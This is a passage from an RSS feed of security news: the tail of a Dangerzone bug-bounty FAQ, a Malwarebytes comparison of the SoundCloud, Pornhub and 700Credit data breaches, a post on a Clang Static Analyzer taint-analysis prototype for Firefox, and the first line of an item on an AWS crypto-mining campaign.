locally?Absolutely! You are encouraged to install Dangerzone locally and experiment with creating a document that can read a file from your PC during the sanitization process. Check out our CI job as well, to see how we plant the flags for the challenge. Once you have crafted your document, feel free to submit the encrypted version as a PR. Happy experimenting!4. Does my submission have to pass the sanitization step?If your submission cannot be sanitized, this means that we can't check for the captured flag in the resulting document. That's not a problem, though, since we look for flags in the conversion logs as well. If you capture a flag, you can print it to the process' stderr, and it will be included in the conversion logs. You should see it in the output of the CI job as well.5. Can I submit any other types of issues?If they undermine Dangerzone's security, you are encouraged to submit them via our Bugcrowd account, and we  assign a payout according to their severity, e.g., what flag they would potentially capture.If they target this CI job, then they are considered out of scope.6. Are we living in such desperate times that people will burn a gVisor/kernel 0-day for anything less than six figures?Of course not! We are living in the merriest of times, where people can contribute their talent to spyware companies, enjoy a big payout, and sleep soundly at night! But at the same time, and let's be real for a second, no one will waste six figures to break Dangerzone. And if they do, this means that Dangerzone will have succeeded in protecting all the rest of the users that are not economically viable targets.The scenario we want to avoid, though, is having a bug lying around that makes it trivial to bypass the defense layers Dangerzone employs. That's what we're looking for here, and the sanitization logic, for that matter, is pretty small. So, hopefully, this bounty will incentivize some folks to give our repo a look.7. Is this a CTF challenge, or a bug bounty program?It's a capped bug bounty program. The backstory is this: Dangerzone has never had a bug bounty program, as its sister project, SecureDrop, has. Our team has managed to secure some money from the bug bounty pool that was not spent this year and decided to give a festive spin to it because, well, why not? We hope that at some point in the future, we'll have an actual bug bounty program in place.]]></content:encoded></item><item><title>SoundCloud, Pornhub, and 700Credit all reported data breaches, but the similarities end there</title><link>https://www.malwarebytes.com/blog/news/2025/12/soundcloud-pornhub-and-700credit-all-reported-data-breaches-but-the-similarities-end-there</link><author></author><category>threatintel</category><pubDate>Tue, 16 Dec 2025 17:04:59 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[Comparing data breaches is like comparing apples and oranges. They differ on many levels. To news media, the size of the brand, how many users were impacted, and how it was done often dominate the headlines. For victims, what really matters is the type of information stolen. And for the organizations involved, the focus is on how they will handle the incident. So, let’s have a look at the three that showed up in the news feeds today.700Credit is a US provider of credit reports, preliminary credit checks, identity verification, fraud detection, and compliance tools for automobile, recreational vehicle, powersports, and marine dealerships.In a notice on its website, 700Credit informed media, partners, and affected individuals that it suffered a third-party supply-chain attack in late October 2025. According to the notice, an attacker gained unauthorized access to personally identifiable information (PII), including names, addresses, dates of birth, and Social Security numbers (SSNs). The breach involves data collected between May and October, impacting roughly 5.6 million people.The supply-chain attack demonstrates the importance of how you handle attacks. Reportedly, 700Credit communicates with more than 200 integration partners through application programming interfaces (APIs). When one of the partners was compromised in July, they failed to notify 700Credit. As a result, unnamed cybercriminals broke into that third-party’s system and exploited an API used to pull consumer information.700Credit shut down the exposed third-party API, notified the FBI and FTC, and is mailing letters to victims offering credit monitoring while coordinating with dealers and state regulators.SoundCloud is a leading audio streaming platform where users can upload, promote, stream, and share music, podcasts, and other audio content.SoundCloud posted a notice on its website stating that it recently detected unauthorized activity in an ancillary service dashboard. Ancillary services refer to specialized functions that help maintain stability and reliability. When SoundCloud contained the attack, it experienced denial-of-service attacks, two of which were able to temporarily disable its platform’s availability on the web.An investigation found that no sensitive data such as financial or password data was accessed. The exposed data consisted of email addresses and information already visible on public SoundCloud profiles. The company estimates the incident affected roughly 20% of its user base.Pornhub is one of the world’s most visited adult video-sharing websites, allowing users to view content anonymously or create accounts to upload and interact with videos.Reportedly, Pornhub disclosed that on November 8, 2025, a security breach at third-party analytics provider Mixpanel exposed “a limited set of analytics events for certain users.” Pornhub stressed that this was not a breach of Pornhub’s own systems, and said that passwords, payment details, and financial information were not exposed. Mixpanel, however, disputes that the data originated from its November 2025 security incident.According to reports, the ShinyHunters ransomware group claims to have obtained about 94 GB of data containing more than 200 million analytics records tied to Pornhub Premium activity. ShinyHunters shared a data sample with BleepingComputer that included a Pornhub Premium member’s email address, activity type, location, video URL, video name, keywords associated with the video, and the time the event occurred.ShinyHunters has told BleepingComputer that it sent extortion demands to Pornhub, and the nature of the exposed data creates clear risks for blackmail, outing, and reputational harm—even though no Social Security numbers, government IDs, or payment card details are in the scope of the breach.As you can see, these are three very different data breaches. Not just in how they happened, but in what they mean for the people affected. While email addresses and knowing that someone uses SoundCloud could be useful for phishers and scammers, it’s a long way from the leverage that comes with detailed records of Pornhub Premium activity. If that doesn’t get you on the list of a “hello pervert” scammer, I don’t know what will.But undoubtedly the most dangerous one for those affected is the 700Credit breach which provides an attacker with enough information for identity theft. In the other cases an attacker will have to penetrate another defense layer, but with a successful identity theft the attacker has reached an important goal.Estimated ~28–36 million users (about 20% of users) ​“Select” Premium users; ~201 million activity records (not 201 million people) ​Email addresses and public profile info ​Names, addresses, dates of birth, SSNs ​​Search, watch, and download activity; attacker-shared samples include email addresses, timestamps, and IP/geo-location dataLow (mostly already public contact/profile data) ​Very high (classic identity‑theft PII) ​​Very high (intimate behavioral and preference data, blackmail/extortion potential) ​Unauthorized access to an internal service dashboard ​Third‑party API compromise (supply‑chain attack) ​​Disputed incident involving third-party analytics data (Mixpanel), following a smishing campaignWe don’t just report on threats—we help safeguard your entire digital identityCybersecurity risks should never spread beyond a headline.

analysis, CTU, the Clang Static Analyzer engine. This will be followed by
the problem statement and the solution. Finally, some closing words.Disclaimer: The work described here was sponsored by Mozilla.Static Analysis FundamentalsVulnerabilities often root from using untrusted data in some way. Data from
such sources is called “tainted” in static analysis, and “taint analysis” is the
technique that tracks how such “tainted” values propagate or “flow”
throughout the program.In short, “Taint sources” introduce a flow, such as reading from a socket. If
a tainted value reaches a “taint sink” then we should report an error. These
“sources” and “sinks” are often configurable.A YAML configuration file can be used with the Clang Static Analyzer
configuring the taint rules.Cross Translation Unit (CTU) analysisThe steps involved in bugs or vulnerabilities might cross file boundaries.
Conventional static analysis tools that operate on a translation-unit basis
would not find the issue. Luckily, the Clang Static Analyzer offers CTU
mode
that loads the relevant pieces of the required translation units to
enhance the contextual view of the analysis target, thus increasing the
covered execution paths. Running CTU needs a bit of setup, but luckily
tools like scan-build
or CodeChecker have built-in support.The Clang Static Analyzer implements a path-sensitive symbolic execution.
Here is an excellent talk
but let us give a refresher here.Basically, it interprets the abstract syntax tree (AST) of the analyzed C/C++
program and builds up program facts statement by statement as it
simulates different execution paths of the program. If it sees an 
statement, it splits into two execution paths: one where the condition is
assumed to be false, and another one where it’s assumed to be true. Loops
are handled slightly differently, but that’s not the point of this post today.When the engine sees a function call, it will jump to the definition of the
callee (if available) and continue the analysis there with the arguments we
had at the call-site. We call this “inlining” in the Clang Static Analyzer. This
makes this engine inter-procedural, in other words, reason across
functions. Of course, this only works if it knows the callee. This means that
without knowing the pointee of a function pointer or the dynamic type of a
polymorphic object (that has virtual functions), it cannot “inline” the callee,
which in turn means that the engine must conservatively relax the program
facts it gathered so far because they might be changed by the callee.For example, if we have some allocated memory, and we pass that pointer
to such a function, then the engine must assume that the pointer was
potentially released, and not raise leak warnings after this point.The conclusion here is that following the control-flow is critical, and virtual
functions limit our ability to reason about this if we don’t know the dynamic
type of objects.So, taint analysis for Firefox?Firefox has a lot of virtual functions!We discussed that control-flow is critical for taint analysis, and virtual
functions ruin the control-flow. A browser has almost every code pattern
you can imagine, and it so happens that many of the motivating use cases
for this analysis involve virtual functions that also happen to cross file
boundaries.It all started by Tom creating a couple of GitHub issues, like 
#114270
(which prompted a couple smaller fixes that are not the subject of this port),
and #62663.This latter one was blocked by not being able to follow the callees of virtual
functions, kicking off this whole subject and the prototype.Plotting against virtual functionsLet’s just look at the AST and build the inheritance graph. After that, if we
see a virtual call to , we could check who overrides this method.Let’s say only class  and  overrides this method in the translation unit.
This means we could split the path into 2 and assume that on one path we
call  and on the other one .This looks nice and simple, and the core of the idea is solid. However, there
are a couple of problems:One translation unit (TU) might define a class , overriding
, and then pass a  pointer to the other translation unit.
And when that TU is analyzed, it shouldn’t be sure that only class 
and  overrides  just because it didn’t see  from the
other TU.
This is the problem with inheritance, which is an “open-set” relation.
One cannot be sure to see the whole inheritance graph all at once.It’s not only that  might be in a different TU, but it might be in
a 3rd party library, and dynamically loaded at runtime. In this case,
assuming a finite set of callees for a virtual function would be wrong.Fixing problem (2) is easy, as we should just assume that the list of
potential callees always has an extra unknown callee, to have an execution
path where the call is conservatively evaluated and do the invalidations -
just like before.Fixing problem (1) is more challenging because we need whole-program
analysis. We need to create the inheritance graphs of each TU and then
merge them into a unified graph. Once we’ve built that, we can run the
Clang Static Analyzer and start reasoning about the overriders of virtual
functions in the whole project.
Consequently, in the example we discussed before, we would know that
class ,  and (crucially)  overrides . So after the call,
we would have 4 execution paths: , ,  and the last path is for
the unknown case (like potentially dynamically loading some library that
overrides this method).It sounds great, but does it work?It does! The analysis gives a list of the potential overriders of a virtual
function. The Clang Static Analyzer was modified to do the path splits we
discussed and remember the dynamic type constraints we learn on the
way. There is one catch though.Some taint flows cross file boundaries, and the Clang Static Analyzer has
CTU to counter this, right?CTU uses the “ASTImporter”,
which is known to have infinite recursion,
crashes and incomplete implementation in terms of what constructs it can
import. There are plenty of examples, but one we encountered
was #123093.Usually fixing one of these is time consuming and needs a deep
understanding of the ASTImporter. And even if you fix one of these, there
will be plenty of others to follow.This patch for “devirtualizing” virtual function calls didn’t really help with the
reliability of the ASTImporter. As the interesting taint flows cross file
boundaries, the benefits of this new feature are unfortunately limited by the
ASTImporter for Firefox.Is it available in the Clang Static Analyzer already?Unfortunately no, and as the contract was over, it is unlikely that these
patches would merge upstream without others splitting up the patches and
doing the labor of proposing them upstream. Note that this whole program
analysis is a brand new feature and it was just a quick prototype to check
the viability.Upstreaming would likely also need some wider consensus about the
design.Apparently, whole-project analyses could be important for other domains
besides bug-finding, such as code rewriting tools, which was the motivation
for a 
recently posted RFC. 
The proposed framework in that RFC could
potentially also work for the use-case described in this blog post, but it’s
important to highlight that this prototype was built before that RFC and
framework, consequently it’s not using that.Balázs shared that working on the prototype was really motivating at first,
but as he started to hit the bugs in the ASTImporter - effectively blocking
the prototype - development slowed down. All in all, the prototype proved
that using project-level information, such as “overriders”, could enable
better control-flow modeling, but CTU analysis as we have it in Clang today
will show its weaknesses when trying to resolve those calls. Without
resolving these virtual calls, we can’t track taint flows across file boundaries
in the Clang Static Analyzer.What does this mean for Firefox?Not much, unfortunately. If the ASTImporter would work as expected, then
finalizing the prototype would meaningfully improve taint analysis on code
using virtual functions.Bonus: We need to talk about the ASTImporterFrom the cases Balázs looked at, it seems like qualified names, such as
 in  for example, will trigger the import of a DeclContext,
which in turn triggers the import of all the declarations within
that lexical declaration context. In other words, we start importing a lot
more things than strictly necessary to make the  qualification work.
This in turn increases the chances of hitting something that causes a crash
or just fails to import, poisoning the original AST we wanted to import into.
This is likely not how it should work, and might be a good subject to discuss
in the future.Note that the ASTImporter can be configured to do so-called “minimal
imports” which is
probably what we should have for the Clang Static
Analyzer, however, 
this is not set,
and setting it would lead to even more crashes. Balázs didn’t investigate this
further, but it might be something to explore in the future.]]></content:encoded></item><item><title>Compromised IAM Credentials Power a Large AWS Crypto Mining Campaign</title><link>https://thehackernews.com/2025/12/compromised-iam-credentials-power-large.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEidILz5c0w2u5MowpqpDcKaSi80yphNWTH5E6d3P9RbsKmrW49tTXLVGax2PmBg1tqbV05p_KchUWn15gqUmKNvzGPFUTa8QpmLO5zAAdT91Gcs0SbpZlMLPrf7cRmAoA_zULMCb1nIVGPp1w_yLPRclMOLJUQgH-safnADcwg3SkHT_Qfn3xbcKlDkOiub/s1600/aws.jpg" length="" type=""/><pubDate>Tue, 16 Dec 2025 16:35:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[An ongoing campaign has been observed targeting Amazon Web Services (AWS) customers using compromised Identity and Access Management (IAM) credentials to enable cryptocurrency mining.
